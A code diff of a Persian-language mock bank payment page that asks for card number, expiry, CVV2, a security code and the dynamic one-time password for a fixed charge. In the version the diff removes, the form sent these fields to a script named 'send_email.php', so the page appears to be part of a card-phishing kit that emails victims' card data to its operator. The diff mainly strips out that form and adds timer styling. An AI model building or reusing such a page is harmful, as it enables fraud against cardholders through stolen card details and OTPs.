@@ -74,6 +74,15 @@
             background: #dc3545;
             color: #fff;
         }
+        .timer {
+            font-size: 16px;
+            color: red;
+            text-align: center;
+            margin-top: 5px;
+        }
+        .hidden {
+            display: none;
+        }
         .request-btn {
             width: 100%;
             padding: 10px;
@@ -104,47 +113,46 @@
 <body>
     <div class="payment-form">
         <h2 style="text-align: center;">درگاه پرداخت</h2>
-        <form action="send_email.php" method="POST">
-            <div class="form-group">
-                <label for="card-number">شماره کارت:</label>
-                <input type="text" id="card-number" name="card-number" placeholder="---- ---- ---- ----" maxlength="19" oninput="formatCardNumber(this)">
-            </div>
-            
-            <div class="form-group">
-                <label for="amount">مبلغ (ریال):</label>
-                <input type="text" id="amount" name="amount" value="1,000,000" disabled>
-            </div>
-            
-            <div class="form-group">
-                <label for="expiry">تاریخ انقضا:</label>
-                <input type="text" id="expiry" name="expiry" placeholder="MM/YY" maxlength="5" oninput="formatExpiry(this)">
-            </div>
+        
+        <div class="form-group">
+            <label for="card-number">شماره کارت:</label>
+            <input type="text" id="card-number" placeholder="---- ---- ---- ----" maxlength="19" oninput="formatCardNumber(this)">
+        </div>
+        
+        <div class="form-group">
+            <label for="amount">مبلغ (ریال):</label>
+            <input type="text" id="amount" value="1,000,000" disabled>
+        </div>
+        
+        <div class="form-group">
+            <label for="expiry">تاریخ انقضا:</label>
+            <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" oninput="formatExpiry(this)">
+        </div>
 
-            <div class="form-group">
-                <label for="cvv2">CVV2:</label>
-                <input type="text" id="cvv2" name="cvv2" placeholder="***" maxlength="4">
-            </div>
+        <div class="form-group">
+            <label for="cvv2">CVV2:</label>
+            <input type="text" id="cvv2" placeholder="***" maxlength="4">
+        </div>
 
-            <div class="form-group">
-                <label>کد امنیتی:</label>
-                <div class="split-input">
-                    <div class="secure-code" id="generated-code"></div>
-                    <input type="text" id="security-code" name="security-code" placeholder="کد امنیتی" maxlength="4">
-                </div>
+        <div class="form-group">
+            <label>کد امنیتی:</label>
+            <div class="split-input">
+                <div class="secure-code" id="generated-code"></div>
+                <input type="text" id="security-code" placeholder="کد امنیتی" maxlength="4">
             </div>
+        </div>
 
-            <div class="form-group">
-                <label>رمز دوم پویا:</label>
-                <div class="split-input">
-                    <input type="text" id="otp-code" name="otp-code" placeholder="رمز پویا" maxlength="6">
-                    <button type="button" class="request-btn" id="request-otp" onclick="requestOTP()">درخواست رمز پویا</button>
-                    <div class="timer-circle" id="otp-timer"></div>
-                </div>
+        <div class="form-group">
+            <label>رمز دوم پویا:</label>
+            <div class="split-input">
+                <input type="text" id="otp-code" placeholder="رمز پویا" maxlength="6">
+                <button class="request-btn" id="request-otp" onclick="requestOTP()">درخواست رمز پویا</button>
+                <div class="timer-circle" id="otp-timer"></div>
             </div>
+        </div>
 
-            <button class="submit-btn" type="submit">پرداخت</button>
-            <button class="cancel-btn" type="button" onclick="cancelPayment()">انصراف</button>
-        </form>
+        <button class="submit-btn">پرداخت</button>
+        <button class="cancel-btn" onclick="cancelPayment()">انصراف</button>
     </div>
 
     <script>
@@ -189,7 +197,7 @@
 
         function cancelPayment() {
             alert("پرداخت لغو شد");
-            window.location.href = "index.html";
+            window.location.href = "index.html"; // بازگشت به صفحه اصلی یا تغییر مسیر به دلخواه
         }
 
         window.onload = function () {
